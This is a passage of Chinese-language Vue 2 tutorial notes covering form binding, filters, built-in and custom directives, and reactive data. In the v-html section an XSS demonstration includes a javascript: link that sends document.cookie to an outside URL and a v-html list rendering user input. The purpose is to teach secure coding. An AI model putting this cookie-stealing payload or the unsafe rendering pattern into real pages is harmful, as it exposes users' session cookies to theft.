<font style="color:#595959;">    <title>表单数据的收集</title></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- submit事件，prevent阻止默认行为 --></font>

<font style="color:#595959;">      <form @submit</font><font style="color:#FF0000;">.prevent</font><font style="color:#595959;">="send"></font>

<font style="color:#595959;">        <!-- </font>**<font style="color:#FF0000;">trim修饰符可以去除前后空白</font>**<font style="color:#595959;"> --></font>

<font style="color:#595959;">        用户名：<input type="text" </font>**<font style="color:#FF0000;">v-model.trim</font>**<font style="color:#595959;">="user.username" /><br /><br /></font>

<font style="color:#595959;">        密码：<input type="password" v-model="user.password" /><br /><br /></font>

<font style="color:#595959;">        <!-- </font>**<font style="color:#FF0000;">number来将字符串转为数字</font>**<font style="color:#595959;"> --></font>

<font style="color:#595959;">        年龄：<input </font>**<font style="color:#FF0000;">type="number"</font>**<font style="color:#595959;"> v-model.number="user.age" /><br /><br /></font>

<font style="color:#595959;">        <!-- </font>**<font style="color:#FF0000;">v-model 主要收集的是value值</font>**<font style="color:#595959;">，否则手机不到信息 --></font>

<font style="color:#595959;">        性别： 男<input type="radio" name="gender" value="1" v-model="user.gender" /></font>

<font style="color:#595959;">           女<input type="radio" name="gender" value="0" v-model="user.gender" /><br /><br /></font>

<font style="color:#595959;">        爱好：</font>

<font style="color:#595959;">        <!-- 注意：</font>**<font style="color:#FF0000;">对于checkbox来说，如果没有手动指定value，</font>**

**<font style="color:#FF0000;">            那么会拿这个标签的checked属性的值作为value</font>**<font style="color:#595959;"> --></font>

<font style="color:#595959;">        旅游<input type="checkbox" v-model="user.interest" value="travel" /> </font>

<font style="color:#595959;">        运动<input type="checkbox" v-model="user.interest" value="sport" /> </font>

<font style="color:#595959;">        唱歌<input  type="checkbox" v-model="user.interest" value="sing"/><br /><br /></font>

<font style="color:#595959;">        学历：</font>

<font style="color:#595959;">        <select v-model="user.grade"></font>

<font style="color:#595959;">          <option value="">请选择学历</option></font>

<font style="color:#595959;">          <option value="zk">专科</option></font>

<font style="color:#595959;">          <option value="bk">本科</option></font>

<font style="color:#595959;">          <option value="ss">硕士</option></font>

<font style="color:#595959;">        </select><br /><br /></font>

<font style="color:#595959;">        简介：</font>

<font style="color:#595959;">        <!-- </font>**<font style="color:#FF0000;">lazy修饰符，失去焦点时再收集信息</font>**<font style="color:#595959;"> --></font>

<font style="color:#595959;">        <textarea cols="50" rows="15" </font>**<font style="color:#FF0000;">v-model.lazy</font>**<font style="color:#595959;">="user.introduce"></textarea></font>

<font style="color:#595959;">        <br /><br /></font>



<font style="color:#595959;">        <input type="checkbox" v-model="user.accept" />阅读并接受协议<br /><br /></font>

<font style="color:#595959;">        <!-- <button @click.prevent="send">注册</button> --></font>

<font style="color:#595959;">        <button>注册</button></font>

<font style="color:#595959;">      </form></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">         </font>**<font style="color:#595959;"> // 将数据单独收集到一个对象中</font>**

<font style="color:#595959;">          user: {</font>

<font style="color:#595959;">            username: "",</font>

<font style="color:#595959;">            password: "",</font>

<font style="color:#595959;">            age: "",</font>

<font style="color:#595959;">            gender: "1", </font>**<font style="color:#595959;">//默认选中，让数据有默认值</font>**

<font style="color:#595959;">            interest: ["travel"],</font>

<font style="color:#595959;">            grade: "ss",</font>

<font style="color:#595959;">            introduce: "",</font>

<font style="color:#595959;">            accept: "",</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          msg: "表单数据的收集",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          send() {</font>

<font style="color:#595959;">            // alert("ajax...!!!!");</font>

<font style="color:#595959;">            // 将数据收集好，发送给服务器。</font>

<font style="color:#595959;">            //JSON.parse()将字符串转为对象</font>

<font style="color:#595959;">            console.log(JSON.stringify(this.user));</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

## 2.12、过滤器
过滤器filters<u>适用于简单的逻辑处理</u>，例如：对一些数据进行格式化显示。他的功能完全可以使用methods，computed来实现。过滤器可以进行全局配置，也可以进行局部配置：

①　<font style="color:#FF0000;">全局</font>配置：在构建任何Vue**<u>实例之前</u>**使用**<font style="color:#FF0000;">Vue.filter(‘过滤器名称’, callback)</font>**进行配置。

②　<font style="color:#FF0000;">局部</font>配置：在构建Vue实例的<u>配置项中使用filters</u>进行局部配置。过滤器可以用在两个地方：<u>插值语法和v-bind指令中。</u>



多个过滤器<font style="color:#FF0000;">可以串联</font>：{{msg | filterA | filterB | filterC}}

过滤器也可以接收额外的参数，但过滤器的<u>第一个参数永远接收的都是前一个过滤器的返回值</u>

需求：

从服务器端返回了一个商品的价格price，这个price的值可能是这几种情况：''、null、undefined、60.5

要求：

如果是'' 、null、undefined ，页面上统一显示为 - 

如果不是，则页面上显示真实的数字即可。 

<font style="color:#FF0000;">在Vue3当中，已经将过滤器语法废弃了。</font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 计算属性实现  formatPrice --></font>

<font style="color:#595959;">      <h2>商品价格：{{formatPrice}}</h2></font>

<font style="color:#595959;">      <!-- 方法实现  formatPrice2() --></font>

<font style="color:#595959;">      <h2>商品价格：{{formatPrice2()}}</h2></font>

<font style="color:#595959;">      <!-- 过滤器实现  放在插值语法中  --></font>

<font style="color:#595959;">      <h2>商品价格：{{price | filterA | filterB(3)}}</h2></font>

<font style="color:#595959;">      <!-- 过滤器放入到v-bind中 ，不能放到v-model中--></font>

<font style="color:#595959;">      <input type="text" :value="price | filterA | filterB(3)" /></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <hr /></font>

<font style="color:#595959;">    <!-- 全局过滤器 --></font>

<font style="color:#595959;">    <div id="app2"></font>

<font style="color:#595959;">      <h2>商品价格：{{price | filterA | filterB(3)}}</h2></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 4、 配置全局的过滤器。</font>

<font style="color:#595959;">      Vue.filter("filterA", function (val) {</font>

<font style="color:#595959;">        if (val === null || val === undefined || val === "") {</font>

<font style="color:#595959;">          return "-";</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">        return val;</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      Vue.filter("filterB", function (val, number) {</font>

<font style="color:#595959;">        return val.toFixed(number);</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      const vm2 = new Vue({</font>

<font style="color:#595959;">        el: "#app2",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          price: 20.3,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "过滤器",</font>

<font style="color:#595959;">          price: 50.6,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        //1、方法实现需求</font>

<font style="color:#595959;">        methods: {</font>

**<font style="color:#595959;">          formatPrice2() {</font>**

**<font style="color:#595959;">            if (this.price === "" || this.price === undefined || this.price === null) {</font>**

**<font style="color:#595959;">              return "-";</font>**

**<font style="color:#595959;">            }</font>**

**<font style="color:#595959;">            return this.price;</font>**

**<font style="color:#595959;">          },</font>**

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 2、计算属性实现</font>

<font style="color:#595959;">        computed: {</font>

<font style="color:#595959;">          formatPrice() {</font>

<font style="color:#595959;">            if (this.price === "" || this.price === undefined || this.price === null) {</font>

<font style="color:#595959;">              return "-";</font>

<font style="color:#595959;">            }</font>

<font style="color:#595959;">            return this.price;</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 3、局部过滤器</font>



<font style="color:#595959;">        /* filters: {</font>

<font style="color:#595959;">          filterA(val) {</font>

<font style="color:#595959;">            if (val === null || val === undefined || val === "") {</font>

<font style="color:#595959;">              return "-";</font>

<font style="color:#595959;">            }</font>

<font style="color:#595959;">            return val;</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">          //需求： 确保传递过来的数据val，保留两位小数。</font>

<font style="color:#595959;">          filterB(val, number) {</font>

<font style="color:#595959;">            console.log(val); //此时的值时filterA的返回值</font>

<font style="color:#595959;">            return val.toFixed(number);</font>

<font style="color:#0000FF;">	//“toFixed”是JavaScript中的一个函数。它用于将一个数字转换为字符串，并指定保留的小数位数。语法为：number.toFixed(digits)，其中number是要转换的数字，digits是一个介于0到20（包括）之间的整数，表示保留的小数位数。例如：(123.456).toFixed(2)会返回字符串"123.46"，它会根据四舍五入来确定最终的小数位数。</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        }, */</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>







### 《2.13、Vue的其他指令》
### 2.13.1、v-text 
将内容填充到标签体当中，并且是以**<u>覆盖</u>**的形式**<u>填充</u>**，而且填充的内容中即使存在HTML标签也只是会当做一个普通的字符串处理，**<u>不会解析</u>**。功能等同于原生JS中的innerText。

### 2.13.2、v-html 
将内容填充到标签体当中，并且是以覆盖的形式填充，而且将填充的内容当做**<u>HTML代码解析</u>**。功能等同于原生JS中的innerHTML。

v-html不要用到用户提交的内容上。可能会导致XSS攻击。



XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript。

例如：用户在留言中恶意植入以下信息：

<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>Document</title></font>

<font style="color:#595959;">    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 需求：简易版的留言板，并将留言进行展示--></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}},test</h1></font>

<font style="color:#595959;">      <ul></font>

<font style="color:#595959;">        <li></font>

<font style="color:#595959;">          <a href='javascript:location.href="http://www.baidu.com/?cookie?"+document.cookie'>点我给你看点好玩的</a></font>

<font style="color:#595959;">        </li></font>

<font style="color:#595959;">        <li v-for="(item,index) of myList" v-html="item" :key="index"></li></font>

<font style="color:#595959;">      </ul></font>

<font style="color:#595959;">      </font>**<font style="color:#595959;"><textarea cols="30" rows="10" v-model.lazy="list"></textarea></font>**

<font style="color:#595959;">      <button @click="send">提交</button></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        data() {</font>

<font style="color:#595959;">          return {</font>

<font style="color:#595959;">            msg: "模拟xss攻击",</font>

<font style="color:#595959;">            myList: [],</font>

<font style="color:#595959;">            list: "",</font>

<font style="color:#595959;">          };</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          send() {</font>

<font style="color:#595959;">            this.myList.push(this.list);</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      }).$mount("#app");</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

### 2.13.3 v-cloak 
**<font style="color:#FF0000;">v-cloak配置css样式</font>****来解决胡子的闪现问题。**

v-cloak指令使用在标签当中，**当Vue实例接管之后会删除这个指令。**

这是一段CSS样式：当前页面中所有带有v-cloak属性的标签都隐藏起来。

<font style="color:#595959;">[v-cloak] {</font>

<font style="color:#595959;">  display : none;</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"><head></font>

<font style="color:#595959;">  <meta charset="UTF-8" /></font>

<font style="color:#595959;">  <title>Vue的其它指令</title></font>

<font style="color:#595959;">  <style></font>

<font style="color:#595959;">    [v-cloak] {</font>

<font style="color:#595959;">      display: none;</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  </style></font>

<font style="color:#595959;"></head></font>

<font style="color:#595959;"><body></font>

<font style="color:#595959;">  <div id="app"></font>

<font style="color:#595959;">    <h1 v-cloak>{{msg}}</h1></font>

<font style="color:#595959;">  </div></font>



<font style="color:#595959;">  <script></font>

<font style="color:#595959;">    // 晚3s引入vue.js</font>

<font style="color:#595959;">    setTimeout(() => {</font>

<font style="color:#595959;">      let scriptElt = document.createElement("script");</font>

<font style="color:#595959;">      scriptElt.src = "./js/vue.js";</font>

<font style="color:#595959;">      document.head.append(scriptElt);</font>

<font style="color:#595959;">    }, 3000);</font>

<font style="color:#595959;">    // 晚4s创建vm实例</font>

<font style="color:#595959;">    setTimeout(() => {</font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Vue的其它指令",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    }, 4000);</font>

<font style="color:#595959;">  </script></font>

<font style="color:#595959;"></body></font>

### 2.13.4 v-once 
初次接触指令的时候已经学过了。**只渲染一次**。之后将被视为静态内容。

### 2.13.5 v-pre 
使用该指令可以提高编译速度。**带有该指令的标签将不会被编译**。可以在没有Vue语法规则的标签中使用可以**提高效率**。不要将它用在带有指令语法以及插值语法的标签中。

<font style="color:#595959;"><body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1 v-cloak>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- v-pre 不参与vue编译，提高效率 --></font>

<font style="color:#595959;">      <h1 v-pre>欢迎学习Vue框架！</h1></font>



<font style="color:#595959;">      <!-- v-once 只执行一次，视为静态页面--></font>

<font style="color:#595959;">       <h2 v-once>{{num}}</h2></font>

<font style="color:#595959;">       <button @click="num++">点我+1</button><br></font>



<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Vue的其它指令",</font>

<font style="color:#595959;">          num:0</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.13.6、自定义指定
#### 2.13.6.1 局部自定义指令
##### 1、函数式
<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>自定义指令</h1></font>

<font style="color:#595959;">      <!-- 需求1：自定义v-text-danger指令，将msg文字变红放入到div中 --></font>

<font style="color:#595959;">      <div v-text="msg"></div></font>

<font style="color:#595959;">      <div v-text-danger="msg"></div></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "自定义指令",</font>

<font style="color:#595959;">          username: "jackson",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">       </font>**<font style="color:#595959;"> // 配置自定义指定</font>**

<font style="color:#595959;">        directives: {</font>

<font style="color:#595959;">          // 可以定义多个指令，‘，’隔开</font>

<font style="color:#595959;">          </font>**<font style="color:#595959;">// 关于指令的名字：</font>**

**<font style="color:#595959;">          // 1. v- 不需要写。</font>**

**<font style="color:#595959;">          // 2. Vue官方建议指令的名字要全部小写。如果是多个单词的话，请使用 - 进行衔接。</font>**

**<font style="color:#595959;">          // 回调函数执行时机：第一个：标签和指令第一次绑定的时候。第二个：模板被重新解析的时候。</font>**

**<font style="color:#595959;">          // 回调函数两个参数：第一个参数是真实的dom元素。 第二个参数是标签与指令之间绑定关系的对象。</font>**



<font style="color:#595959;">          //需求1 写法一、函数式</font>

<font style="color:#595959;">          'text-danger' : function(element, binding){</font>

<font style="color:#595959;">                    console.log('@')</font>

<font style="color:#595959;">                    element.innerText = binding.value</font>

<font style="color:#595959;">                    element.style.color = 'red'</font>

<font style="color:#595959;">                },</font>

<font style="color:#595959;">           //需求2:</font>

<font style="color:#595959;">           // 自定义一个指令，可以和v-bind指令完成相同的功能，同时将该元素的父级元素的背景色设置为蓝色。    </font>

<font style="color:#595959;">         'bind-blue' : function(element, binding){</font>

<font style="color:#595959;">                    element.value = binding.value</font>

<font style="color:#595959;">                    console.log(element)</font>

<font style="color:#595959;">                    </font>**<font style="color:#595959;">// 为什么是null，原因是这个函数在执行的时候，指令和元素完成了绑定，</font>**

**<font style="color:#595959;">                    //但是只是在内存当中完成了绑定，元素还没有被插入到页面当中。</font>**

**<font style="color:#595959;">                    //不在页面中，就不会有他的父元素</font>**

<font style="color:#595959;">                    console.log(element.parentNode)</font>

<font style="color:#595959;">                    element.parentNode.style.backgroundColor = 'blue'</font>

<font style="color:#595959;">                } </font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

##### 2、对象式
<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <!-- 需求2:</font>

<font style="color:#595959;">            自定义一个指令，可以和v-bind指令完成相同的功能，同时将该元素的父级元素的背景色设置为蓝色。</font>

<font style="color:#595959;">    --></font>

<font style="color:#595959;">      v-bind：用户名：<input type="text" v-bind:value="username" /></font>

<font style="color:#595959;">      v-bind-blue：用户名：<input type="text" v-bind-blue="username" /></div></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "自定义指令",</font>

<font style="color:#595959;">          username: "jackson",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // 配置自定义指定</font>

<font style="color:#595959;">        directives: {</font>

**<font style="color:#595959;">        // 写法二 、对象式</font>**

<font style="color:#595959;">         'bind-blue' : {</font>

<font style="color:#595959;">                // 这个对象中三个方法的名字不能随便写。这三个函数将来都会被自动调用。</font>

<font style="color:#595959;">                // 注意：在特定的时间节点调用特定的函数，这种被调用的函数称为钩子函数。</font>

<font style="color:#595959;">                </font>

<font style="color:#595959;">                </font>**<font style="color:#FF0000;">// 元素与指令初次绑定的时候，自动调用bind</font>**

<font style="color:#595959;">                </font>**<font style="color:#FF0000;">bind(element, binding){</font>**

<font style="color:#595959;">                    element.value = binding.value</font>

<font style="color:#595959;">          </font>**<font style="color:#FF0000;">      },</font>**

<font style="color:#595959;">              </font>**<font style="color:#FF0000;">  // 元素被插入到页面之后，这个函数自动被调用。</font>**

<font style="color:#595959;">             </font>**<font style="color:#FF0000;">   inserted(element, binding){</font>**

<font style="color:#595959;">                    element.parentNode.style.backgroundColor = 'blue'</font>

<font style="color:#595959;">        </font>**<font style="color:#FF0000;">        },</font>**

**<font style="color:#FF0000;">                // 当模板重新解析的时候，这个函数会被自动调用。</font>**

**<font style="color:#FF0000;">                update(element, binding){</font>**

<font style="color:#595959;">                    element.value = binding.value</font>

**<font style="color:#FF0000;">                }</font>**

<font style="color:#595959;">              } </font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

#### 2.13.6.2 全局自定义指令
<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>自定义指令</h1></font>

<font style="color:#595959;">      <div v-text="msg"></div></font>

<font style="color:#595959;">      <div v-text-danger="msg"></div></font>



<font style="color:#595959;">      v-bind：用户名：<input type="text" v-bind:value="username" /><br></font>

<font style="color:#595959;">      <div>v-bind-blue：用户名：<input type="text" v-bind-blue="username" /></div></div></font>

<font style="color:#595959;">    </font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <hr></font>



<font style="color:#595959;">    <div id="app2"></font>

<font style="color:#595959;">      <div v-text-danger="msg"></div></font>

<font style="color:#595959;">      <div>用户名：<input type="text" v-bind-blue="username" /></div></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <script></font>

**<font style="color:#FF0000;">      // 定义全局的指令</font>**

**<font style="color:#FF0000;">      // 函数式</font>**

**<font style="color:#FF0000;">      Vue.directive("text-danger", function (element, binding) {</font>**

<font style="color:#595959;">        //对于自定义指令来说，函数体当中的this是window，而不是vue实例。</font>

<font style="color:#595959;">        console.log(this);</font>

<font style="color:#595959;">        element.innerText = binding.value;</font>

<font style="color:#595959;">        element.style.color = "red";</font>

**<font style="color:#FF0000;">      });</font>**



**<font style="color:#FF0000;">      // 对象式</font>**

**<font style="color:#FF0000;">      Vue.directive("bind-blue", {</font>**

<font style="color:#595959;">        </font>**<font style="color:#FF0000;">bind(element, binding) {</font>**

<font style="color:#595959;">          element.value = binding.value;</font>

<font style="color:#595959;">          console.log(this);</font>

**<font style="color:#FF0000;">        },</font>**

<font style="color:#595959;">      </font>**<font style="color:#FF0000;">  inserted(element, binding) {</font>**

<font style="color:#595959;">          element.parentNode.style.backgroundColor = "skyblue";</font>

<font style="color:#595959;">          console.log(this);</font>

**<font style="color:#FF0000;">        },</font>**

<font style="color:#595959;">      </font>**<font style="color:#FF0000;">  update(element, binding) {</font>**

<font style="color:#595959;">          element.value = binding.value;</font>

<font style="color:#595959;">          console.log(this);</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      </font>**<font style="color:#FF0000;">}</font>**<font style="color:#595959;">);</font>



<font style="color:#595959;">      const vm2 = new Vue({</font>

<font style="color:#595959;">        el: "#app2",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "欢迎学习Vue框架！",</font>

<font style="color:#595959;">          username: "lucy",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">      const vm= new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "欢迎学习Vue框架！",</font>

<font style="color:#595959;">          username: "jack",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 《2.14、添加响应式数据》
### 2.14.1. 什么是响应式？
<u>修改data后，页面自动改变/刷新。这就是响应式</u>。就像我们在使用excel的时候，修改一个单元格中的数据，其它单元格的数据会联动更新，这也是响应式。

### 2.14.2. Vue的响应式是如何实现的？
**<font style="color:#FF0000;">数据劫持</font>**：Vue底层使用了Object.defineProperty，将data中的数据放到了_data中，在_data中配置了setter方法，当去修改属性值时，setter方法则被自动调用，**<font style="color:#FF0000;">setter方法中不仅修改了属性值，而且还做了其他的事情</font>**，例如：重新渲染页面。setter方法就像半路劫持一样，所以称为数据劫持。

### 2.14.3. Vue会给data中所有的属性，以及属性中的属性，都会添加响应式。
### 2.14.4. 后期添加的属性，不会有响应式，怎么处理？
**<font style="color:#FF0000;">①　Vue.set(目标对象, ‘属性名’, 值)</font>**

**<font style="color:#FF0000;">②　vm.$set(目标对象, ‘属性名’, 值)</font>**

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <div>姓名：{{name}}</div></font>

<font style="color:#595959;">      <div>年龄：{{age}}岁</div></font>

<font style="color:#595959;">      <div>数字：{{a.b.c.e}}</div></font>

<font style="color:#595959;">      <div>邮箱：{{a.email}}</div></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "响应式与数据劫持",</font>

<font style="color:#595959;">          name: "jackson",</font>

<font style="color:#595959;">          age: 20,</font>

<font style="color:#595959;">          a: {</font>

<font style="color:#595959;">            b: {</font>

<font style="color:#595959;">              c: {</font>

<font style="color:#595959;">                e: 1,</font>

<font style="color:#595959;">              },</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      // 1、测试：后期给Vue实例动态的追加的一些属性，会添加响应式处理吗？</font>

<font style="color:#595959;">      //vm.$data.a.email = 'jack@126.com'</font>

<font style="color:#595959;">      // </font>**<font style="color:#595959;">通过这种直接方式后期给vm追加的属性并没有添加响应式处理</font>**<font style="color:#595959;">。</font>



<font style="color:#595959;">      //2、 如果你想给后期追加的属性添加响应式处理的话，调用以下两个方法都可以：</font>

<font style="color:#595959;">      // Vue.set() 、 vm.$set()</font>

<font style="color:#595959;">      //Vue.set(目标对象, 属性名, 属性值)</font>

<font style="color:#595959;">      //Vue.set(vm.$data.a, 'email', 'jack@126.com')</font>

<font style="color:#595959;">      //Vue.set(vm.a, 'email', 'jack@123.com')</font>

<font style="color:#595959;">      vm.$set(vm.a, "email", "jack@456.com");</font>



<font style="color:#595959;">      </font>**<font style="color:#595959;">//3、 避免在运行时向Vue实例或其根$data添加响应式</font>**

**<font style="color:#595959;">      // 不能直接给vm / vm.$data 追加响应式属性。只能在声明时提前定义好。</font>**

**<font style="color:#595959;">      //Vue.set(vm, 'x', '1')</font>**

**<font style="color:#595959;">      //Vue.set(vm.$data, 'x', '1')</font>**

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.14.5. Vue没有给数组下标0,1,2,3....添加响应式，怎么处理？
①　调用Vue提供的7个API：

**<font style="color:#FF0000;">push()</font>**

**<font style="color:#FF0000;">pop()</font>**

**<font style="color:#FF0000;">reverse()</font>**

**<font style="color:#FF0000;">splice()</font>**

**<font style="color:#FF0000;">shift()</font>**

**<font style="color:#FF0000;">unshift()</font>**

**<font style="color:#FF0000;">sort()</font>**

**<font style="color:#FF0000;">或者使用：</font>**

**<font style="color:#FF0000;">Vue.set(数组对象, ‘index’, 值)</font>**

**<font style="color:#FF0000;">vm.$set(数组对象, ‘index’, 值)</font>**

<font style="color:#595959;"> <body></font>

<font style="color:#595959;">    <!-- </font>

<font style="color:#595959;">        1. 通过数组的下标去修改数组中的元素，默认情况下是没有添加响应式处理的。怎么解决？</font>

<font style="color:#595959;">             可以通过控制台去修改数组元素</font>

<font style="color:#595959;">        </font>

<font style="color:#595959;">        2. 第一种方案：</font>

<font style="color:#595959;">           </font>**<font style="color:#595959;"> vm.$set(数组对象, 下标, 值)  vm.$set(vm.users,0,'杰克')</font>**

**<font style="color:#595959;">            Vue.set(数组对象, 下标, 值)  vm.set(vm.users,0,'杰克')</font>**



<font style="color:#595959;">        3. 第二种方案：</font>

<font style="color:#595959;">            </font>**<font style="color:#595959;">push() </font>**<font style="color:#595959;">   在数组 尾部逐个添加 元素，返回结果数组的长度，能接收任意数量参数，push() 修改了原数组。</font>

<font style="color:#595959;">            </font>**<font style="color:#595959;">pop()</font>**<font style="color:#595959;">  移除数组最后一项，返回的是被移除项。修改原数组</font>

<font style="color:#595959;">            </font>**<font style="color:#595959;">reverse()</font>**<font style="color:#595959;"> 可将数组进行倒序,此方法会改变原数组。</font>

<font style="color:#595959;">            </font>**<font style="color:#595959;">splice()</font>**<font style="color:#595959;"> 通过删除或替换现有元素或者原地添加新的元素来修改数组，并以数组形式返回被修改的内容。此方法会改变原数组。</font>

<font style="color:#595959;">            </font>**<font style="color:#595959;">shift() </font>**<font style="color:#595959;">删除数组的第一项元素，返回被删除的元素， 修改原数组</font>

<font style="color:#595959;">          </font>**<font style="color:#595959;">  unshift()</font>**<font style="color:#595959;"> 向数组的头部添加元素，返回的是结果数组的长度，修改原数组</font>

**<font style="color:#595959;">            sort() </font>**<font style="color:#595959;">可将数组项灵活地进行升序或降序排列,此方法会改变原数组。</font>



<font style="color:#595959;">    </font>**<font style="color:#595959;">        在Vue当中，通过以上的7个方法来给数组添加响应式处理。</font>**

<font style="color:#595959;">     --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <ul></font>

<font style="color:#595959;">        <li v-for="user in users">{{user}}</li></font>

<font style="color:#595959;">      </ul></font>

<font style="color:#595959;">      <ul></font>

<font style="color:#595959;">        <li v-for="vip in vips" :key="vip.id">{{vip.name}}</li></font>

<font style="color:#595959;">      </ul></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      const vm = new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "数组的响应式处理",</font>

<font style="color:#595959;">          users: ["jack", "lucy", "james"],</font>

<font style="color:#595959;">          vips: [</font>

<font style="color:#595959;">            { id: "111", name: "zhangsan" },</font>

<font style="color:#595959;">            { id: "222", name: "lisi" },</font>

<font style="color:#595959;">          ],</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        methods: {</font>

<font style="color:#595959;">          update(){</font>

<font style="color:#595959;">            // this.users[0]='tom'</font>

